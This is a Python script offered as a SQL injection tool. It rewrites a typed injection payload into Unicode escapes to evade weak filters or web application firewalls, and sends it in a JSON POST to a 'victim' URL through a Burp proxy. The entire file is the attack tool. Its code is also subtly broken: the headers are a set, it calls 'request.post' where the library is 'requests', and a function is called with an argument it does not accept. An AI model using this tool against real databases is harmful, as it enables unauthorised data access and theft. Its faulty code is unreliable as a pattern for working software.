#!/usr/bin/python3
#Scape Unicode SQLInjection
#This script is useful to bypass weak filtering and/or WAFs in JSON contexes
#U put ur Injection, the script represent it in escape Unicode and send the payload to the BD specified

from pwn import *
import requests, pdb, signal, time, json

def def_handler(sig, frame): #This end the script

        print("\n\nSaliendo...\n")
        sys.exit(1)

# Ctrl + c To exit
signal.signal(signal.SIGINT, def_handler)

# Global Variables
main_url = "" #You need to put the URL of ur victim here to do the SQLI

BurpSuite_Proxy = {'http': 'http://127.0.0.1:8080'}

def getUnicode(sqli):

    sqli_modified = ""

    for character in sqli:
        sqli_modified += "\\u00" + hex(ord(character))[2::]
    
    return sqli_modified

def makeRequest(): # In this func u need to change all depends in ur victim, Content-type and The payload to send

    headers = {'Content-Type:' 'application/json;charset=utf-8'} #You specifie here the Type of headers u want to use, here the example with json
    
    post_data = '{"name":"%s"}' % sqli_modified #This is the payload, change as u want, to send the Hexcode put the %s where u need it,example here

    REQUEST = request.post(main_url, headers=headers, data=post_data, proxies=BurpSuite_Proxy) #Send a POST to the victim URL with the header specified and the data to send is the post_data which was specified before  //IMPORTANT if u dont want to use burb proxy delete proxies=BurpSuite_Proxy

    data_json = json.loads(REQUEST.text) #This change the format of the output for be more readable
    return (json.dumps(data_json, indent=4))

if __name__ == '__main__':
        
    while True:

        sqli = input("> ")
        sqli = sqli.strip() #Avoid line scape
        
        sqli_modified = getUnicode(sqli)

        response_json = makeRequest(sqli_modified) #Save the output
        print(response_json)
